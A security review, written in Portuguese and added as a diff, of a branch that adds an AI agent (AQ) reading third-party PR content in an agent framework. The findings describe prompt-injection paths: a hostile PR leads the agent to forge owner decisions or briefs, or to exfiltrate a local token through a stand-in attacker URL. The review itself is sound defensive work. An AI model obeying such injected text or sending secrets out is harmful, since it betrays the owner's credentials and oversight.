@@ -1,0 +1,70 @@
+---
+tipo: revisao-seguranca
+contrato: 1
+pedido: aq
+branch: melhoria/aq
+commit: efdd72e6d4a90d1da6b11b919bc41bab155afe1b
+parecer: reprovado
+revisor: forge:security-engineer
+data: 2026-10-17
+---
+# Review de segurança: aq
+
+Escopo: `git diff 0095d299b9b9383ecf9eba336e83c764f707ae5f...efdd72e6d4a90d1da6b11b919bc41bab155afe1b`, 25 arquivos (+416 / -7). Os controles revisados são `hooks/conformidade.json`, `hooks/conformidade.py`, `tests/config.json`, `scripts/jarvis-forge`, `dev/` (manifesto e `dev/agents/aq.md`), a ADR 0009 e os testes e fixtures do AQ. A revisão é estática, com execução local do hook sobre fixtures descartáveis numa cópia (`git archive`) fora da worktree. Não escrevi esta branch.
+
+## Gatilhos
+`R-SEGURANCA`: a mudança toca o hook `conformidade` e a política dele (papel novo e lista de permissão de escrita), `tests/config.json` e o atalho que monta a sessão do Forge (`scripts/jarvis-forge`). Também cria um agente que lê conteúdo de terceiros.
+
+## Modelo de ameaças (resumo)
+Ativos: a política e os hooks do Forge, os agentes e as skills (instruções que todos os projetos executam), os artefatos de pedido da sessão do Forge (pedidos com as decisões do dono, briefs aprovados pelo conferente, quadro), os projetos que usam o Forge na mesma máquina e os segredos locais.
+
+Fronteira nova: conteúdo de contribuição de terceiros (corpo e diff de PR, sugestão, página buscada), que não é confiável, chega ao AQ (`opus`). O AQ tem Read, Grep, Glob, Write, Edit e WebFetch e não tem Bash. A saída dele volta ao Jarvis, que tem Bash.
+
+```mermaid
+flowchart LR
+  T[Contribuidor terceiro] -->|PR / sugestão| J[Jarvis: prepara o pacote]
+  J -->|worktree pr-n + corpo/diff| AQ[forge-dev:aq]
+  AQ -->|Write/Edit| H{hook conformidade}
+  H -->|lista de permissão| P[docs/propostas, docs/arquitetura]
+  H -->|entrada extra| C[~/.forge-contrib/docs: pedidos, briefs, kanban]
+  AQ -->|WebFetch| W[(rede)]
+  AQ -->|relatório| J
+  C -->|brief e decisões lidos como autoridade| TL[tech-lead e outros com Bash]
+```
+
+STRIDE, por prioridade:
+- **Tampering / elevação** (injeção leva o AQ a gravar onde agentes com Bash leem como autoridade): achado 1. Fora disso, a escrita fica contida (ver "Verificado").
+- **Information disclosure** (injeção leva o AQ a ler um segredo e mandá-lo para fora): achado 2.
+- **Escopo** (o AQ atua num projeto que usa o Forge): achado 3.
+- **Negação da guarda** (erro interno libera a escrita): achado 4.
+- **Spoofing** (outro tipo se passar por `forge-dev:aq`, ou o `forge-dev` vir de uma branch de trabalho): sem caminho. O plugin só sai da cópia em uso (ver "Verificado").
+
+## Verificado (sem achado)
+- **Caminho relativo, `..` e link simbólico:** o hook resolve com `realpath` antes de decidir (`hooks/conformidade.py:438-440`, `:427-430`). Com fixtures descartáveis e o papel `forge-dev:aq`, `{raiz}/docs/propostas/../../hooks/x.py`, o relativo `docs/propostas/../../bin/x` e `docs/propostas/l/x.py`, com `l` como link para `hooks/`, saíram com código 2. Um link plantado num PR de terceiro (worktree `pr-<n>`) que aponte para fora da lista também é barrado, porque vale o destino resolvido. Sem Bash, o AQ não cria link.
+- **Worktree fora da raiz:** `aq-propostas-em-worktree-libera` e `aq-agents-em-worktree-bloqueia` passam: a raiz git mais próxima é a da worktree, e `agents/` nela é barrado. Gravar um `.git` falso dentro de `docs/propostas/` não abre fuga, porque a raiz nova fica sempre dentro de um caminho já permitido.
+- **A lista só restringe:** ela roda depois de `caminhos` (`hooks/conformidade.py:411-413`), então não libera o que `caminhos` barra. Também vale no ramo Bash (`checar_escrita` → `caminho_barrado`), como defesa em profundidade se o `tools:` mudar.
+- **Política malformada falha fechado:** `escrita_valida` (`hooks/conformidade.py:1131-1133`) entra em `politica_valida` (`:1149`). Objeto em lista, papel sem lista, lista vazia e item não texto bloqueiam (`tests/test_hooks.py:464-472`, rodado: OK).
+- **AQ sem Bash e fora das ações críticas:** `dev/agents/aq.md:4` não tem Bash, e o teste `tests/test_forge.py:159-160` garante isso. `aq` não aparece em `acoes` (`hooks/conformidade.json:20-26`) nem em nenhum `quem` de `caminhos`, então merge, PR e instalação de pacote ficam fora do alcance dele.
+- **O segundo `--plugin-dir` vem só da cópia em uso:** `scripts/jarvis-forge:147` fixa `cd "$HOME/Forge"`, `:154` escolhe a cópia vigente (clone da `origin/develop`) ou, no `--dev`, `.` (o `~/Forge`), e `:159` acrescenta só `"$plugin_dir/dev"`. Nada vem de `~/.forge-contrib/wt/*`. Os testes `tests/test_forge.py:1034-1055` cobrem os três casos. O `forge-dev` fica fora do `marketplace.json` e do manifesto do `forge` (`tests/test_forge.py:141-151`).
+- **Nenhuma regra nem invariante saiu:** `docs/regras/` não foi tocado. `tests/config.json` só recebe acréscimos (+2/-0, `dev` em duas listas de pastas). A ADR 0009 também (+3/-0).
+- **Rodado:** as 12 fixtures `aq-*` contra o hook deram o código esperado, e `test_hooks.Hooks.test_escrita_permitida_malformada_bloqueia` com `test_forge.PluginDeDesenvolvimento` deu 5 testes OK.
+
+## Achados
+| # | Severidade | Evidência | Problema e caminho de ataque | Correção mínima | Esforço | Dono |
+|---|---|---|---|---|---|---|
+| 1 | média (bloqueia) | `hooks/conformidade.json:15`; `docs/adr/0009-conformidade-dos-agentes.md:70`; `dev/agents/aq.md:28` ("e artefatos do pedido"); `tests/hooks/conformidade/aq-escreve-docs-do-pedido-libera.json` | A entrada `~/.forge-contrib/docs/` está fora do brief. Ela dá ao AQ, o único papel que lê conteúdo de terceiros por função, escrita em `pedidos/` (onde ficam as linhas "DECISÃO DO DONO"), em `briefs/` (que os agentes com Bash seguem literalmente), em `kanban/` e em `pendentes/`. Prova: Write do `forge-dev:aq` em `~/.forge-contrib/docs/pedidos/x.md` e em `.../briefs/x-tech-lead-1.md` saiu com código 0. Caminho: um contribuidor externo põe uma instrução no corpo ou no diff do PR. O Jarvis entrega o pacote ao AQ, que obedece e acrescenta uma decisão falsa do dono ao pedido ativo ou altera um brief. O próximo papel com Bash executa sob uma autorização forjada. O hash do brief no conferente só detecta a mudança depois da conferência, e o pedido não tem hash. O limite é o merge da `main`, que continua com o dono, e os hooks dos outros papéis. Neutralidade: o prefixo `~/.forge-contrib` é convenção da fábrica (`hooks/_comum.py:91-93`, `README.md:50,56`), mas a árvore `docs/` dele, com pedidos e briefs da sessão do Forge, não é definida por nenhum texto versionado. | Tirar a entrada da lista, a frase da ADR 0009 (`:70`), "e artefatos do pedido" de `dev/agents/aq.md:28` e a fixture `aq-escreve-docs-do-pedido-libera`. No lugar, uma fixture que barra o AQ em `~/.forge-contrib/docs/pedidos/`. O AQ grava só em `docs/propostas/` e `docs/arquitetura/` da worktree, e o Jarvis leva ao pedido o que precisar. Se o dono quiser uma pasta de rascunho fora do git, isso vira decisão dele (`R-DECISAO`), com um subdiretório próprio e nunca `pedidos/`, `briefs/`, `kanban/` ou `pendentes/`. | P | `tech-lead` (autor) |
+| 2 | média (decisão do dono) | `dev/agents/aq.md:4` (`WebFetch` junto com `Read`); desenho `aq-desenho.md`, seção 3 | O AQ junta as três condições de exfiltração por injeção: lê conteúdo não confiável, lê arquivos locais (o Read não passa pelo sandbox do Bash, que só nega leitura ao Bash; não confirmei por execução e não li nenhum segredo) e tem saída para a rede (WebFetch com URL livre). Caminho: um PR de terceiro instrui o AQ a ler um token local e chamar `https://atacante/?d=<token>`. O ganho é a credencial do dono. Também há um canal sem rede: gravar o dado em `docs/propostas/`, que alguém commita e envia ao repositório público. A ferramenta veio do desenho aprovado e do brief, então o autor não errou. | Tirar `WebFetch` do AQ: quem pesquisa documentação é o Jarvis ou o `software-architect`, e o AQ recebe o texto no pacote. A alternativa é o dono aceitar o risco por aceite (`riscos-aceitos`). Leve ao dono pelo Jarvis (`R-DECISAO`). Para aprovar na volta, uma das duas precisa estar resolvida. | P | dono → `tech-lead` |
+| 3 | baixa | `hooks/conformidade.py:427-430` | A raiz extra é "qualquer raiz git que contém o arquivo". Assim o AQ grava `docs/arquitetura/` e `docs/propostas/` de qualquer repositório da máquina, inclusive de um projeto que usa o Forge. Prova: Write em `{tmp}/home/proj/docs/arquitetura/plano.md` saiu com código 0. Isso contraria "não atua nos projetos" (E1), e a injeção do achado 1 alcançaria o plano técnico de um projeto. Fora do diretório de trabalho, o Claude Code pede permissão, e isso atenua. | Aceitar a raiz extra só se for a raiz da sessão, uma worktree em `~/.forge-contrib/wt/` ou um clone do Forge (`e_clone_do_forge`), e acrescentar uma fixture que barra um repositório qualquer. | P | `tech-lead` |
+| 4 | baixa | `hooks/_comum.py:618-620`, com `CRITICO` em `hooks/conformidade.py:27-30` | Em erro interno, o hook só falha fechado se o caminho tiver marcador crítico. `agents/`, `skills/`, `bin/`, `scripts/` e `hooks/*.py` (fora `conformidade.json`) não têm marcador. Uma exceção na decisão do AQ (por exemplo, `PermissionError` em `exists()` ao subir as pastas) libera exatamente o que a lista de permissão existe para barrar. Sem Bash, o AQ não provoca esse erro com facilidade, então a probabilidade é baixa. | Para as ferramentas de arquivo, quando o `agent_type` cai num papel com `escrita_permitida`, falhar fechado em erro interno. Teste com a política válida e uma exceção forçada. | P | `tech-lead` |
+| 5 | informativa | `tests/test_forge.py:157` (`[:2]`) | O teste aceita qualquer entrada a mais na lista do AQ, e foi assim que o achado 1 passou sem barulho. Os casos `..`, relativo e link simbólico, que conferi à mão, não têm fixture. | Comparar a lista inteira e acrescentar as três fixtures de regressão (barram com código 2). | P | `tech-lead` |
+| 6 | informativa | `dev/.claude-plugin/plugin.json`; `hooks/conformidade.json:28-52` | O Claude Code também descobre por convenção `hooks/`, `commands/`, `skills/` e `.mcp.json` na raiz de um plugin. Um arquivo desses em `dev/` entraria em toda sessão do Forge sem estar no manifesto. `dev/.claude-plugin/` também não tem a proteção de `.claude-plugin/` (branch `melhoria/*`, `tech-lead`/`doc`). O caminho continua sendo PR revisado, por isso é só informativo. | Teste: `dev/` contém só `.claude-plugin/plugin.json` e `agents/*.md`. | P | `tech-lead` |
+| 7 | informativa | `agents/jarvis.md` (sem mudança neste diff) | Fuga pelo Jarvis: o relatório do AQ sobre uma contribuição volta ao Jarvis, que tem Bash. Nenhum texto diz ainda que esse relatório é insumo de decisão e nunca instrução, nem como o pacote é montado. Isso é da operação (E2), não deste brief. | Quando a operação E2 for escrita: o parecer do AQ vai ao dono como proposta, e o Jarvis não executa nada pedido nele. | P | `software-architect` / Jarvis |
+
+## Plano em cartões
+- Cartão 1 (achado 1, bloqueia): tirar `~/.forge-contrib/docs/` da lista, da ADR, do agente e da fixture, e criar a fixture que barra o AQ em `pedidos/`. Dono: `tech-lead`.
+- Cartão 2 (achado 2): decisão do dono pelo Jarvis, entre tirar o `WebFetch` (o autor corrige) e o aceite do risco. Dono: usuário.
+- Cartão 3 (achados 3, 4 e 5): raiz extra só em cópia do Forge, falha fechada para o papel com lista, teste da lista inteira e fixtures de regressão. Dono: `tech-lead`. Podem ir na mesma volta do cartão 1.
+- Cartões 4 e 5 (achados 6 e 7): recomendações, sem bloqueio.
+
+## Riscos aceitos e ferramentas
+Riscos aceitos: nenhum. Ferramentas: `gitleaks`, `semgrep`, `zizmor`, `actionlint` e `osv-scanner` não estão no PATH (lacuna; o diff não tem dependência nem workflow). Conferi por leitura que o diff não traz segredo. A execução foi só local: o hook do commit revisado sobre fixtures temporárias em `$TMPDIR`.
